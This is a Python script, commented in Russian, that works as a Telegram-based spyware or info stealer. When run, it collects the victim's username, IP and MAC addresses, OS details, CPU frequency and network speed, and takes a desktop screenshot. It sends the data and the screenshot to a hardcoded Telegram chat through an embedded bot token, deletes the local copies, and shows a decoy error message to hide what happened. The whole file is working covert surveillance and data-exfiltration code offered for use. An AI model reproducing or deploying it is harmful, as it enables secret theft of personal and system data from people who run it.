# -*- coding: utf-8 -*-
import telebot
import getpass
import os
import socket
from datetime import datetime
from uuid import getnode as get_mac
import pyautogui
from speedtest import Speedtest
import psutil
import platform
from SSIM_PIL import compare_ssim

# from SSIM_PIL import Image


bot = telebot.TeleBot("5156211104:AAEqLaNH9lDXeOkSsepWBbtKh-pRfbxvRag")
bot.send_message('978245502', 'Произошел запуск')
start = datetime.now()
# Основа
name = getpass.getuser()  # Имя пользователя
ip = socket.gethostbyname(socket.getfqdn())  # IP-адрес системы
mac = get_mac()  # MAC-адрес
ost = platform.uname()  # Название операционной системы
# Проверяем скорость интернет соединения
inet = Speedtest()
download = float(str(inet.download())[0:2] + "." + str(round(inet.download(), 2))[1]) * 0.125  # Входящая скорость
uploads = float(str(inet.upload())[0:2] + "." + str(round(inet.upload(), 2))[1]) * 0.125  # Исходящая скорость
# Часовой пояс и время
zone = psutil.boot_time()  # Узнает время заданное на компе
time = datetime.fromtimestamp(zone)  # Форматируем результат
# Частота процессора
cpu = psutil.cpu_freq()
# Скриншот рабочего стола
os.getcwd()
screen = pyautogui.screenshot("screenshot.jpg")  # Скриншот
# Конец отсчета
ends = datetime.now()
workspeed = format(ends - start)
# Записываем файл с полученными данными
file = open("info.txt", "w")
file.write(
    f"[====================================]\n Operating System: {ost.system}\n Processor: {ost.processor}\n Username: {name}\n IP adress: {ip}\n MAC adress: {mac}\n"
    f"Timezone: {time.year}/{time.month}/{time.day}/  {time.hour}:{time.minute}:{time.second}\n Workspeed: {workspeed} \n  Dowload: {download} MB/s\n Upload: {uploads} MB/s\n"
    f"Max Frequency: {cpu.max:.2f} Mhz\n Min Frequency: {cpu.min:.2f} Mhz\n Current Frequency: {cpu.current:.2f} Mhz\n "
    f"[==========================================] ")
file.close()
# Название скриншота
text = "Screenshot"
# Обработка исключения пути
try:
    os.chdir(r"/temp/path")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):  # Обвязка бота
        upfile = open("info.txt", "rb")  # Получаем файл
        upphoto = open("screenshot.jpg", "rb")  # Получаем скриншот
        bot.send_document('978245502', upphoto)
        bot.send_document('978245502', upfile)
        upfile.close()
        upphoto.close()
        os.remove("info.txt")
        os.remove("screenshot.jpg")
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()


    bot.polling()
    raise SystemExit
